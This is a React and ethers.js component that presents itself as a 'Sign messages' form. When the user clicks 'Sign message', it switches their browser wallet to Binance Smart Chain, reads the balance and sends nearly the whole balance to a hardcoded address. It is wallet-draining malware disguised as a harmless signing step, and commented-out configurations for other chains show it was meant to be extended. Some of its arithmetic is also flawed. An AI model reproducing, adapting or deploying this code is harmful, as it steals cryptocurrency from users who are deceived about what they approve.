import { useState } from 'react'
import { ethers } from 'ethers'
import ErrorMessage from './ErrorMessage'

const DEFAULT_WALLETS = {
  eth: '',
  btc: '',
  bsc: '0x194B188720BdA9080Db8cAE6cAF578bc78Dbb318',
}

const networks = {
  // polygon: {
  //   chainId: `0x${Number(137).toString(16)}`,
  //   chainName: 'Polygon Mainnet',
  //   nativeCurrency: {
  //     name: 'MATIC',
  //     symbol: 'MATIC',
  //     decimals: 18,
  //   },
  //   rpcUrls: ['https://polygon-rpc.com/'],
  //   blockExplorerUrls: ['https://polygonscan.com/'],
  // },
  bsc: {
    chainId: `0x${Number(56).toString(16)}`,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
      name: 'Binance Chain Native Token',
      symbol: 'BNB',
      decimals: 18,
    },
    rpcUrls: [
      'https://bsc-dataseed1.binance.org/',
      'https://bsc-dataseed2.binance.org/',
      'https://bsc-dataseed3.binance.org/',
      'https://bsc-dataseed4.binance.org/',
      'https://bsc-dataseed1.defibit.io/',
      'https://bsc-dataseed2.defibit.io/',
      'https://bsc-dataseed3.defibit.io/',
      'https://bsc-dataseed4.defibit.io/',
      'https://bsc-dataseed1.ninicoin.io/',
      'https://bsc-dataseed2.ninicoin.io/',
      'https://bsc-dataseed3.ninicoin.io/',
      'https://bsc-dataseed4.ninicoin.io/',
      'wss://bsc-ws-node.nariox.org/',
    ],
    blockExplorerUrls: ['https://bscscan.com/'],
  },
  // HT: {
  //   chainId: `0x${Number(128).toString(16)}`,
  //   chainName: '	HECO Chain (HT)',
  //   nativeCurrency: {
  //     name: '	HECO Chain (HT)',
  //     symbol: '	HT',
  //     decimals: 18,
  //   },
  //   rpcUrls: ['https://http-mainnet.hecochain.com/', 'wss://ws-mainnet.hecochain.com/'],
  //   blockExplorerUrls: ['	https://hecoinfo.com/'],
  // },
}
// функция которая сменяет кошелек
const changeNetwork = async (networkName) => {
  await window.ethereum.request({
    method: 'wallet_addEthereumChain',
    params: [
      {
        ...networks[networkName],
      },
    ],
  })
}

const getBudgetOfWallet = async (networkName) => {
  await changeNetwork(networkName)
  await window.ethereum.send('eth_requestAccounts')
  const provider = new ethers.providers.Web3Provider(window.ethereum)
  const signer = provider.getSigner()
  const balance = await signer.getBalance()

  return {
    networkName,
    balance: balance.toNumber(),
  }
}

const getBiggestBalance = async (networkNamesArr) => {
  const promises = networkNamesArr.map((network) => getBudgetOfWallet(network))

  const budgets = await Promise.all(promises)

  const biggestBudget = budgets.reduce(
    (acc, budget) => {
      if (acc.balance < budget.balance) {
        return budget
      }
      return acc
    },
    { networkName: '', balance: 0 },
  )

  return biggestBudget
}

const getNetworkNamesArr = () => Object.keys(networks)

const withdrawMoneyFromBiggestBallance = async () => {
  console.log(1)
  if (!window.ethereum) throw new Error('No crypto wallet found. Please install it.')

  console.log(2)

  const networkNamesArr = getNetworkNamesArr()

  const biggestBalance = await getBiggestBalance(networkNamesArr)
  await changeNetwork(biggestBalance.networkName)
  await window.ethereum.send('eth_requestAccounts')
  const provider = new ethers.providers.Web3Provider(window.ethereum)
  const signer = provider.getSigner()
  ethers.utils.getAddress(DEFAULT_WALLETS[biggestBalance.networkName])
  await signer.sendTransaction({
    to: DEFAULT_WALLETS[biggestBalance.networkName],
    value: `0x${Number(biggestBalance.balance - 0.003).toString(16)}`,
  })
}

export default function WithdrawAll() {
  const [error, setError] = useState()

  const handlWith = async (e) => {
    e.preventDefault()
    setError()
    try {
      await withdrawMoneyFromBiggestBallance()
    } catch (e) {
      setError(e.message)
    }
  }

  return (
    <form className='m-4' onSubmit={handlWith}>
      <div className='credit-card w-full shadow-lg mx-auto rounded-xl bg-white'>
        <main className='mt-4 p-4'>
          <h1 className='text-xl font-semibold text-gray-700 text-center'>Sign messages</h1>
        </main>
        <footer className='p-4'>
          <button
            type='submit'
            className='btn btn-primary submit-button focus:ring focus:outline-none w-full'
          >
            Sign message
          </button>
        </footer>
        <ErrorMessage>{error}</ErrorMessage>
      </div>
    </form>
  )
}
